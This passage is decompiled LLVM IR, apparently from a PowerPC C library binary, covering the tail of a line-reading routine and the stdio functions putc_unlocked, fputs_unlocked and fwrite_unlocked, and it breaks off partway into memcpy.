  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1000ce94, label %dec_label_pc_1000ce0c

dec_label_pc_1000ce0c:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1000ce743 = add i32 %arg2, -1
  store i32 %v2_1000ce743, i32* @r29, align 4
  %v4_1000ce7c9 = icmp eq i32 %arg2, 1
  br i1 %v4_1000ce7c9, label %dec_label_pc_1000ce80, label %dec_label_pc_1000ce14

dec_label_pc_1000ce14:                            ; preds = %dec_label_pc_1000ce0c, %dec_label_pc_1000ce74.backedge
  %v2_1000ce30 = phi i32 [ %v2_1000ce3012, %dec_label_pc_1000ce74.backedge ], [ %tmp, %dec_label_pc_1000ce0c ]
  %v0_1000ce14 = phi i32 [ %v0_1000ce78, %dec_label_pc_1000ce74.backedge ], [ %arg3, %dec_label_pc_1000ce0c ]
  %v1_1000ce14 = add i32 %v0_1000ce14, 16
  %v2_1000ce14 = inttoptr i32 %v1_1000ce14 to i32*
  %v3_1000ce14 = load i32, i32* %v2_1000ce14, align 4
  %v1_1000ce18 = add i32 %v0_1000ce14, 24
  %v2_1000ce18 = inttoptr i32 %v1_1000ce18 to i32*
  %v3_1000ce18 = load i32, i32* %v2_1000ce18, align 4
  %v2_1000ce1c = add i32 %v3_1000ce14, 1
  store i32 %v2_1000ce1c, i32* %r11.global-to-local, align 4
  %v3_1000ce20 = icmp ult i32 %v3_1000ce14, %v3_1000ce18
  %v5_1000ce20 = icmp eq i32 %v3_1000ce14, %v3_1000ce18
  store i1 %v5_1000ce20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ce20, label %dec_label_pc_1000ce28, label %dec_label_pc_1000ce44

dec_label_pc_1000ce28:                            ; preds = %dec_label_pc_1000ce14
  %v4_1000ce14 = inttoptr i32 %v3_1000ce14 to i8*
  %v3_1000ce28 = load i8, i8* %v4_1000ce14, align 1
  %v3_1000ce2c = icmp eq i8 %v3_1000ce28, 10
  store i1 %v3_1000ce2c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ce30 = inttoptr i32 %v2_1000ce30 to i8*
  store i8 %v3_1000ce28, i8* %v3_1000ce30, align 1
  %v0_1000ce34 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ce34 = load i32, i32* @r30, align 4
  %v2_1000ce34 = add i32 %v1_1000ce34, 16
  %v3_1000ce34 = inttoptr i32 %v2_1000ce34 to i32*
  store i32 %v0_1000ce34, i32* %v3_1000ce34, align 4
  %v0_1000ce38 = load i32, i32* @r31, align 4
  %v1_1000ce38 = add i32 %v0_1000ce38, 1
  store i32 %v1_1000ce38, i32* @r31, align 4
  %v0_1000ce3c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000ce3c, label %dec_label_pc_1000ce80, label %dec_label_pc_1000ce74.backedge

dec_label_pc_1000ce44:                            ; preds = %dec_label_pc_1000ce14
  %v1_1000ce7810 = inttoptr i32 %v0_1000ce14 to i16*
  store i32 268488264, i32* @lr, align 4
  %v5_1000ce44 = call i32 @getc_unlocked(i16* %v1_1000ce7810, i32 %v3_1000ce14)
  %v6_1000ce44 = trunc i32 %v5_1000ce44 to i8
  %v4_1000ce48 = icmp eq i8 %v6_1000ce44, -1
  store i1 %v4_1000ce48, i1* %cr7_eq.global-to-local, align 1
  %v3_1000ce50 = icmp eq i8 %v6_1000ce44, 10
  store i1 %v3_1000ce50, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000ce48, label %dec_label_pc_1000ce58, label %dec_label_pc_1000ce68

dec_label_pc_1000ce58:                            ; preds = %dec_label_pc_1000ce44
  %v0_1000ce58 = load i32, i32* @r30, align 4
  %v1_1000ce58 = inttoptr i32 %v0_1000ce58 to i16*
  %v2_1000ce58 = load i16, i16* %v1_1000ce58, align 2
  %v1_1000ce5c = and i16 %v2_1000ce58, 8
  %v3_1000ce5c = icmp eq i16 %v1_1000ce5c, 0
  br i1 %v3_1000ce5c, label %dec_label_pc_1000ce58.dec_label_pc_1000ce80_crit_edge, label %dec_label_pc_1000ce94

dec_label_pc_1000ce58.dec_label_pc_1000ce80_crit_edge: ; preds = %dec_label_pc_1000ce58
  %v0_1000ce80.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ce80

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce44
  %v3_1000ce68 = load i32, i32* @r31, align 4
  %v4_1000ce68 = inttoptr i32 %v3_1000ce68 to i8*
  store i8 %v6_1000ce44, i8* %v4_1000ce68, align 1
  %v0_1000ce6c = load i32, i32* @r31, align 4
  %v1_1000ce6c = add i32 %v0_1000ce6c, 1
  store i32 %v1_1000ce6c, i32* @r31, align 4
  %v0_1000ce70 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000ce70, label %dec_label_pc_1000ce80, label %dec_label_pc_1000ce74.backedge

dec_label_pc_1000ce74.backedge:                   ; preds = %dec_label_pc_1000ce68, %dec_label_pc_1000ce28
  %v2_1000ce3012 = phi i32 [ %v1_1000ce6c, %dec_label_pc_1000ce68 ], [ %v1_1000ce38, %dec_label_pc_1000ce28 ]
  %v0_1000ce74 = load i32, i32* @r29, align 4
  %v2_1000ce74 = add i32 %v0_1000ce74, -1
  store i32 %v2_1000ce74, i32* @r29, align 4
  %v0_1000ce78 = load i32, i32* @r30, align 4
  %v4_1000ce7c = icmp eq i32 %v0_1000ce74, 1
  br i1 %v4_1000ce7c, label %dec_label_pc_1000ce80, label %dec_label_pc_1000ce14

dec_label_pc_1000ce80:                            ; preds = %dec_label_pc_1000ce68, %dec_label_pc_1000ce74.backedge, %dec_label_pc_1000ce28, %dec_label_pc_1000ce0c, %dec_label_pc_1000ce58.dec_label_pc_1000ce80_crit_edge
  %v2_1000ce8c = phi i32 [ %v0_1000ce80.pre, %dec_label_pc_1000ce58.dec_label_pc_1000ce80_crit_edge ], [ %tmp, %dec_label_pc_1000ce0c ], [ %v1_1000ce38, %dec_label_pc_1000ce28 ], [ %v2_1000ce3012, %dec_label_pc_1000ce74.backedge ], [ %v1_1000ce6c, %dec_label_pc_1000ce68 ]
  %v1_1000ce80 = load i32, i32* @r28, align 4
  %v3_1000ce80 = icmp ugt i32 %v2_1000ce8c, %v1_1000ce80
  %v4_1000ce80 = icmp eq i32 %v2_1000ce8c, %v1_1000ce80
  store i1 %v4_1000ce80, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ce80, label %dec_label_pc_1000ce88, label %dec_label_pc_1000ce94

dec_label_pc_1000ce88:                            ; preds = %dec_label_pc_1000ce80
  %v3_1000ce8c = inttoptr i32 %v2_1000ce8c to i8*
  store i8 0, i8* %v3_1000ce8c, align 1
  %v0_1000ce9c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000ce98

dec_label_pc_1000ce94:                            ; preds = %dec_label_pc_1000ce58, %dec_label_pc_1000ce80, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000ce98

dec_label_pc_1000ce98:                            ; preds = %dec_label_pc_1000ce88, %dec_label_pc_1000ce94
  %v0_1000ce9c = phi i32 [ %v0_1000ce9c.pre, %dec_label_pc_1000ce88 ], [ 0, %dec_label_pc_1000ce94 ]
  ret i32 %v0_1000ce9c

; uselistorder directives
  uselistorder i32 %v2_1000ce8c, { 0, 2, 1 }
  uselistorder i8 %v6_1000ce44, { 1, 0, 2 }
  uselistorder i32 %v3_1000ce18, { 1, 0 }
  uselistorder i32 %v3_1000ce14, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1000ce14, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ce98, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ce80, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000ce14, { 1, 0 }
}

define i32 @putc_unlocked(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_1000cec8 = add i32 %arg2, 16
  %v3_1000cec8 = inttoptr i32 %v2_1000cec8 to i32*
  %v4_1000cec8 = load i32, i32* %v3_1000cec8, align 4
  store i32 %v4_1000cec8, i32* %r11.global-to-local, align 4
  %v2_1000cecc = add i32 %arg2, 28
  %v3_1000cecc = inttoptr i32 %v2_1000cecc to i32*
  %v4_1000cecc = load i32, i32* %v3_1000cecc, align 4
  %v2_1000ced0 = icmp ult i32 %v4_1000cec8, %v4_1000cecc
  br i1 %v2_1000ced0, label %dec_label_pc_1000ced8, label %dec_label_pc_1000ceec

dec_label_pc_1000ced8:                            ; preds = %entry
  %v1_1000ced81 = zext i8 %arg1 to i32
  %v1_1000cedc = add i32 %v4_1000cec8, 1
  store i32 %v1_1000cedc, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ced81, i32* %r3.global-to-local, align 4
  %v3_1000cee4 = inttoptr i32 %v4_1000cec8 to i8*
  store i8 %arg1, i8* %v3_1000cee4, align 1
  %v0_1000cf90.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cf90.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cf90

dec_label_pc_1000ceec:                            ; preds = %entry
  %tmp11 = inttoptr i32 %arg2 to i16*
  %v3_1000ceec = load i16, i16* %tmp11, align 2
  %v4_1000ceec = zext i16 %v3_1000ceec to i32
  %v1_1000cef0 = call i32 @__asm_rlwinm(i32 %v4_1000ceec, i32 0, i32 24, i32 25)
  %v3_1000cef4 = icmp eq i32 %v1_1000cef0, 192
  br i1 %v3_1000cef4, label %dec_label_pc_1000cf10, label %dec_label_pc_1000cefc

dec_label_pc_1000cefc:                            ; preds = %dec_label_pc_1000ceec
  store i32 %arg2, i32* @r3, align 4
  store i32 128, i32* @r4, align 4
  store i32 268488456, i32* @lr, align 4
  %v0_1000cf04 = call i32 @__stdio_trans2w_o()
  store i32 %v0_1000cf04, i32* %r3.global-to-local, align 4
  %v3_1000cf08 = icmp eq i32 %v0_1000cf04, 0
  br i1 %v3_1000cf08, label %dec_label_pc_1000cf10, label %dec_label_pc_1000cfbc

dec_label_pc_1000cf10:                            ; preds = %dec_label_pc_1000cefc, %dec_label_pc_1000ceec
  %v0_1000cf10 = load i32, i32* @r31, align 4
  %v1_1000cf10 = add i32 %v0_1000cf10, 4
  %v2_1000cf10 = inttoptr i32 %v1_1000cf10 to i32*
  %v3_1000cf10 = load i32, i32* %v2_1000cf10, align 4
  %v0_1000cf14 = load i32, i32* @r30, align 4
  %v1_1000cf14 = urem i32 %v0_1000cf14, 256
  store i32 %v1_1000cf14, i32* %r3.global-to-local, align 4
  %v3_1000cf18 = icmp eq i32 %v3_1000cf10, -2
  br i1 %v3_1000cf18, label %dec_label_pc_1000cfc0, label %dec_label_pc_1000cf20

dec_label_pc_1000cf20:                            ; preds = %dec_label_pc_1000cf10
  %v1_1000cf20 = add i32 %v0_1000cf10, 12
  %v2_1000cf20 = inttoptr i32 %v1_1000cf20 to i32*
  %v3_1000cf20 = load i32, i32* %v2_1000cf20, align 4
  store i32 %v3_1000cf20, i32* %r9.global-to-local, align 4
  %v1_1000cf24 = add i32 %v0_1000cf10, 8
  %v2_1000cf24 = inttoptr i32 %v1_1000cf24 to i32*
  %v3_1000cf24 = load i32, i32* %v2_1000cf24, align 4
  %v4_1000cf28 = icmp eq i32 %v3_1000cf20, %v3_1000cf24
  br i1 %v4_1000cf28, label %dec_label_pc_1000cf98, label %dec_label_pc_1000cf30

dec_label_pc_1000cf30:                            ; preds = %dec_label_pc_1000cf20
  %v1_1000cf30 = add i32 %v0_1000cf10, 16
  %v2_1000cf30 = inttoptr i32 %v1_1000cf30 to i32*
  %v3_1000cf30 = load i32, i32* %v2_1000cf30, align 4
  %v4_1000cf34 = icmp eq i32 %v3_1000cf20, %v3_1000cf30
  br i1 %v4_1000cf34, label %dec_label_pc_1000cf3c, label %dec_label_pc_1000cf4c

dec_label_pc_1000cf3c:                            ; preds = %dec_label_pc_1000cf30
  store i32 %v0_1000cf10, i32* @r3, align 4
  store i32 268488516, i32* @lr, align 4
  %v0_1000cf40 = call i32 @__stdio_wcommit()
  store i32 %v0_1000cf40, i32* %r3.global-to-local, align 4
  %v3_1000cf44 = icmp eq i32 %v0_1000cf40, 0
  br i1 %v3_1000cf44, label %dec_label_pc_1000cf3c.dec_label_pc_1000cf4c_crit_edge, label %dec_label_pc_1000cfbc

dec_label_pc_1000cf3c.dec_label_pc_1000cf4c_crit_edge: ; preds = %dec_label_pc_1000cf3c
  %v0_1000cf4c.pre = load i32, i32* @r31, align 4
  %v0_1000cf50.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cf4c

dec_label_pc_1000cf4c:                            ; preds = %dec_label_pc_1000cf3c.dec_label_pc_1000cf4c_crit_edge, %dec_label_pc_1000cf30
  %v0_1000cf50 = phi i32 [ %v0_1000cf50.pre, %dec_label_pc_1000cf3c.dec_label_pc_1000cf4c_crit_edge ], [ %v0_1000cf14, %dec_label_pc_1000cf30 ]
  %v0_1000cf4c = phi i32 [ %v0_1000cf4c.pre, %dec_label_pc_1000cf3c.dec_label_pc_1000cf4c_crit_edge ], [ %v0_1000cf10, %dec_label_pc_1000cf30 ]
  %v1_1000cf4c = add i32 %v0_1000cf4c, 16
  %v2_1000cf4c = inttoptr i32 %v1_1000cf4c to i32*
  %v3_1000cf4c = load i32, i32* %v2_1000cf4c, align 4
  store i32 %v3_1000cf4c, i32* %r9.global-to-local, align 4
  %v1_1000cf50 = urem i32 %v0_1000cf50, 256
  store i32 %v1_1000cf50, i32* %r11.global-to-local, align 4
  %v1_1000cf54 = trunc i32 %v0_1000cf50 to i8
  %v3_1000cf54 = inttoptr i32 %v3_1000cf4c to i8*
  store i8 %v1_1000cf54, i8* %v3_1000cf54, align 1
  %v0_1000cf58 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cf58 = add i32 %v0_1000cf58, 1
  store i32 %v1_1000cf58, i32* %r9.global-to-local, align 4
  %v1_1000cf5c = load i32, i32* @r31, align 4
  %v2_1000cf5c = add i32 %v1_1000cf5c, 16
  %v3_1000cf5c = inttoptr i32 %v2_1000cf5c to i32*
  store i32 %v1_1000cf58, i32* %v3_1000cf5c, align 4
  %v0_1000cf60 = load i32, i32* @r31, align 4
  %v1_1000cf60 = inttoptr i32 %v0_1000cf60 to i16*
  %v2_1000cf60 = load i16, i16* %v1_1000cf60, align 2
  %v3_1000cf60 = zext i16 %v2_1000cf60 to i32
  %v1_1000cf64 = and i32 %v3_1000cf60, 256
  store i32 %v1_1000cf64, i32* %r9.global-to-local, align 4
  %v3_1000cf64 = icmp eq i32 %v1_1000cf64, 0
  br i1 %v3_1000cf64, label %dec_label_pc_1000cfb4, label %dec_label_pc_1000cf6c

dec_label_pc_1000cf6c:                            ; preds = %dec_label_pc_1000cf4c
  %v0_1000cf6c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000cf6c = icmp eq i32 %v0_1000cf6c, 10
  br i1 %v3_1000cf6c, label %dec_label_pc_1000cf74, label %dec_label_pc_1000cfb4

dec_label_pc_1000cf74:                            ; preds = %dec_label_pc_1000cf6c
  store i32 %v0_1000cf60, i32* @r3, align 4
  store i32 268488572, i32* @lr, align 4
  %v0_1000cf78 = call i32 @__stdio_wcommit()
  store i32 %v0_1000cf78, i32* %r3.global-to-local, align 4
  %v3_1000cf7c = icmp eq i32 %v0_1000cf78, 0
  br i1 %v3_1000cf7c, label %dec_label_pc_1000cfb4, label %dec_label_pc_1000cf84

dec_label_pc_1000cf84:                            ; preds = %dec_label_pc_1000cf74
  %v0_1000cf84 = load i32, i32* @r31, align 4
  %v1_1000cf84 = add i32 %v0_1000cf84, 16
  %v2_1000cf84 = inttoptr i32 %v1_1000cf84 to i32*
  %v3_1000cf84 = load i32, i32* %v2_1000cf84, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000cf8c = add i32 %v3_1000cf84, -1
  store i32 %v1_1000cf8c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000cf90

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000ced8, %dec_label_pc_1000cf84
  %v1_1000cf90 = phi i32 [ %v1_1000cf90.pre, %dec_label_pc_1000ced8 ], [ %v0_1000cf84, %dec_label_pc_1000cf84 ]
  %v0_1000cf90 = phi i32 [ %v0_1000cf90.pre, %dec_label_pc_1000ced8 ], [ %v1_1000cf8c, %dec_label_pc_1000cf84 ]
  %v2_1000cf90 = add i32 %v1_1000cf90, 16
  %v3_1000cf90 = inttoptr i32 %v2_1000cf90 to i32*
  store i32 %v0_1000cf90, i32* %v3_1000cf90, align 4
  %v0_1000cfd0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cfc0

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf20
  %v1_1000cf98 = inttoptr i32 %v0_1000cf10 to i16*
  store i32 %v0_1000cf10, i32* %r3.global-to-local, align 4
  %v2_1000cf9c = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_1000cfa4 = trunc i32 %v0_1000cf14 to i8
  store i8 %v6_1000cfa4, i8* %stack_var_-24, align 1
  store i32 268488620, i32* @lr, align 4
  %v5_1000cfa8 = call i32 @__stdio_WRITE(i16* %v1_1000cf98, i32 %v2_1000cf9c)
  store i32 %v5_1000cfa8, i32* %r3.global-to-local, align 4
  %v3_1000cfac = icmp eq i32 %v5_1000cfa8, 0
  br i1 %v3_1000cfac, label %dec_label_pc_1000cfbc, label %dec_label_pc_1000cfb4

dec_label_pc_1000cfb4:                            ; preds = %dec_label_pc_1000cf6c, %dec_label_pc_1000cf98, %dec_label_pc_1000cf74, %dec_label_pc_1000cf4c
  %v0_1000cfb4 = load i32, i32* @r30, align 4
  %v1_1000cfb4 = urem i32 %v0_1000cfb4, 256
  store i32 %v1_1000cfb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cfc0

dec_label_pc_1000cfbc:                            ; preds = %dec_label_pc_1000cf3c, %dec_label_pc_1000cefc, %dec_label_pc_1000cf98
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cfc0

dec_label_pc_1000cfc0:                            ; preds = %dec_label_pc_1000cf10, %dec_label_pc_1000cfb4, %dec_label_pc_1000cf90, %dec_label_pc_1000cfbc
  %v0_1000cfd0 = phi i32 [ %v1_1000cf14, %dec_label_pc_1000cf10 ], [ %v1_1000cfb4, %dec_label_pc_1000cfb4 ], [ %v0_1000cfd0.pre, %dec_label_pc_1000cf90 ], [ -1, %dec_label_pc_1000cfbc ]
  ret i32 %v0_1000cfd0

; uselistorder directives
  uselistorder i32 %v1_1000cfb4, { 1, 0 }
  uselistorder i32 %v0_1000cf50, { 1, 0 }
  uselistorder i32 %v1_1000cf14, { 1, 0 }
  uselistorder i32 %v0_1000cf14, { 1, 2, 0 }
  uselistorder i32 %v0_1000cf10, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_1000cec8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 9, 6, 11, 7, 8, 1, 10, 0 }
  uselistorder i32 %arg2, { 0, 4, 1, 2, 3 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cfc0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000cfbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cfb4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000cf90, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000cfec = call i32 @__GI_strlen()
  store i32 %v0_1000cfec, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000d008.414 to i32), i32* @lr, align 4
  %v4_1000d004 = inttoptr i32 %arg2 to i16*
  %v5_1000d004 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000cfec, i16* %v4_1000d004)
  %v1_1000d00c = load i32, i32* @r27, align 4
  %v4_1000d00c = icmp eq i32 %v5_1000d004, %v1_1000d00c
  br i1 %v4_1000d00c, label %dec_label_pc_1000d014, label %dec_label_pc_1000d018

dec_label_pc_1000d014:                            ; preds = %entry
  br label %dec_label_pc_1000d018

dec_label_pc_1000d018:                            ; preds = %entry, %dec_label_pc_1000d014
  %v0_1000d018 = phi i32 [ -1, %entry ], [ %v5_1000d004, %dec_label_pc_1000d014 ]
  ret i32 %v0_1000d018

; uselistorder directives
  uselistorder label %dec_label_pc_1000d018, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000d048 = load i16, i16* %arg4, align 2
  %v4_1000d048 = zext i16 %v3_1000d048 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000d058 = call i32 @__asm_rlwinm(i32 %v4_1000d048, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000d060 = icmp eq i32 %v1_1000d058, 192
  br i1 %v3_1000d060, label %dec_label_pc_1000d074, label %dec_label_pc_1000d068

dec_label_pc_1000d068:                            ; preds = %entry
  store i32 268488812, i32* @lr, align 4
  %v0_1000d068 = call i32 @__stdio_trans2w_o()
  %v3_1000d06c = icmp eq i32 %v0_1000d068, 0
  br i1 %v3_1000d06c, label %dec_label_pc_1000d074, label %dec_label_pc_1000d0cc

dec_label_pc_1000d074:                            ; preds = %dec_label_pc_1000d068, %entry
  %v0_1000d074 = load i32, i32* @r29, align 4
  %v3_1000d074 = icmp eq i32 %v0_1000d074, 0
  %v0_1000d078 = load i32, i32* @r30, align 4
  %v3_1000d078 = icmp eq i32 %v0_1000d078, 0
  %brmerge = or i1 %v3_1000d074, %v3_1000d078
  br i1 %brmerge, label %dec_label_pc_1000d0cc, label %dec_label_pc_1000d084

dec_label_pc_1000d084:                            ; preds = %dec_label_pc_1000d074
  %v2_1000d08c = udiv i32 -1, %v0_1000d074
  %v0_1000d090 = load i32, i32* @r31, align 4
  %v3_1000d094 = icmp ugt i32 %v0_1000d078, %v2_1000d08c
  %v1_1000d0ac = inttoptr i32 %v0_1000d090 to i16*
  br i1 %v3_1000d094, label %dec_label_pc_1000d0ac, label %dec_label_pc_1000d09c

dec_label_pc_1000d09c:                            ; preds = %dec_label_pc_1000d084
  %v0_1000d088 = load i32, i32* @r28, align 4
  %v2_1000d09c = mul i32 %v0_1000d078, %v0_1000d074
  store i32 %v2_1000d09c, i32* %r4.global-to-local, align 4
  store i32 268488868, i32* @lr, align 4
  %v5_1000d0a0 = call i32 @__stdio_fwrite(i32 %v0_1000d088, i32 %v2_1000d09c, i16* %v1_1000d0ac)
  %v1_1000d0a4 = load i32, i32* @r29, align 4
  %v2_1000d0a4 = udiv i32 %v5_1000d0a0, %v1_1000d0a4
  store i32 %v2_1000d0a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d0d0

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d084
  %v2_1000d0ac = load i16, i16* %v1_1000d0ac, align 2
  %v1_1000d0b0 = or i16 %v2_1000d0ac, 8
  store i16 %v1_1000d0b0, i16* %v1_1000d0ac, align 2
  %v0_1000d0b8 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000d0c4 = inttoptr i32 %v0_1000d0b8 to i32*
  store i32 22, i32* %v2_1000d0c4, align 4
  %v0_1000d0d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d0d0

dec_label_pc_1000d0cc:                            ; preds = %dec_label_pc_1000d074, %dec_label_pc_1000d068
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d0d0

dec_label_pc_1000d0d0:                            ; preds = %dec_label_pc_1000d0ac, %dec_label_pc_1000d09c, %dec_label_pc_1000d0cc
  %v0_1000d0d4 = phi i32 [ %v0_1000d0d4.pre, %dec_label_pc_1000d0ac ], [ %v2_1000d0a4, %dec_label_pc_1000d09c ], [ 0, %dec_label_pc_1000d0cc ]
  ret i32 %v0_1000d0d4

; uselistorder directives
  uselistorder i16* %v1_1000d0ac, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder label %dec_label_pc_1000d0d0, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000d0e8 = load i32, i32* @r5, align 4
  %v1_1000d0e8 = call i32 @__asm_rlwinm.(i32 %v0_1000d0e8, i32 29, i32 3, i32 31)
  store i32 %v1_1000d0e8, i32* %r9.global-to-local, align 4
  %v4_1000d0e8 = icmp eq i32 %v1_1000d0e8, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000d0ec = load i32, i32* @r4, align 4
  %v1_1000d0ec = add i32 %v0_1000d0ec, -4
  store i32 %v1_1000d0ec, i32* %r4.global-to-local, align 4
  %v0_1000d0f0 = load i32, i32* @r3, align 4
  %v1_1000d0f0 = add i32 %v0_1000d0f0, -4
  store i32 %v1_1000d0f0, i32* @r11, align 4
  br i1 %v4_1000d0e8, label %dec_label_pc_1000d118, label %dec_label_pc_1000d0f8

dec_label_pc_1000d0f8:                            ; preds = %entry
  %v1_1000d0f8 = urem i32 %v1_1000d0f0, 4
  %v3_1000d0f8 = icmp eq i32 %v1_1000d0f8, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000d0f8, label %dec_label_pc_1000d100, label %dec_label_pc_1000d154

dec_label_pc_1000d100:                            ; preds = %dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge, %dec_label_pc_1000d0f8
  %v1_1000d10c.pre = phi i32 [ %v1_1000d0f0, %dec_label_pc_1000d0f8 ], [ %v1_1000d10c.pre.pre, %dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge ]
  %v0_1000d100 = phi i32 [ %v1_1000d0e8, %dec_label_pc_1000d0f8 ], [ %v1_1000d174, %dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000d0f8 ], [ %v2_1000d15c, %dec_label_pc_1000d174.dec_label_pc_1000d100_crit_edge ]
  store i32 %v0_1000d100, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d104

dec_label_pc_1000d104:                            ; preds = %dec_label_pc_1000d104, %dec_label_pc_1000d100
  %v1_1000d10c = phi i32 [ %v2_1000d110, %dec_label_pc_1000d104 ], [ %v1_1000d10c.pre, %dec_label_pc_1000d100 ]
  %v0_1000d104 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d104 = add i32 %v0_1000d104, 4
  %v2_1000d104 = inttoptr i32 %v1_1000d104 to i32*
  %v3_1000d104 = load i32, i32* %v2_1000d104, align 4
  %v1_1000d108 = add i32 %v0_1000d104, 8
  %v2_1000d108 = inttoptr i32 %v1_1000d108 to i32*
  %v3_1000d108 = load i32, i32* %v2_1000d108, align 4
  store i32 %v3_1000d108, i32* %r9.global-to-local, align 4
  store i32 %v1_1000d108, i32* %r4.global-to-local, align 4
  %v2_1000d10c = add i32 %v1_1000d10c, 4
  %v3_1000d10c = inttoptr i32 %v2_1000d10c to i32*
  store i32 %v3_1000d104, i32* %v3_1000d10c, align 4
  %v0_1000d110 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d110 = load i32, i32* @r11, align 4
  %v2_1000d110 = add i32 %v1_1000d110, 8
  %v3_1000d110 = inttoptr i32 %v2_1000d110 to i32*
  store i32 %v0_1000d110, i32* %v3_1000d110, align 4
  store i32 %v2_1000d110, i32* @r11, align 4
  %v0_1000d114 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d114 = add i32 %v0_1000d114, -1
  store i32 %v1_1000d114, i32* %ctr.global-to-local, align 4
  %v2_1000d114 = icmp eq i32 %v1_1000d114, 0
  br i1 %v2_1000d114, label %dec_label_pc_1000d118, label %dec_label_pc_1000d104

dec_label_pc_1000d118:                            ; preds = %dec_label_pc_1000d104, %dec_label_pc_1000d174, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000d15c, %dec_label_pc_1000d174 ], [ %.0, %dec_label_pc_1000d104 ]
  %v1_1000d118 = urem i32 %.1, 8
  store i32 %v1_1000d118, i32* @r5, align 4
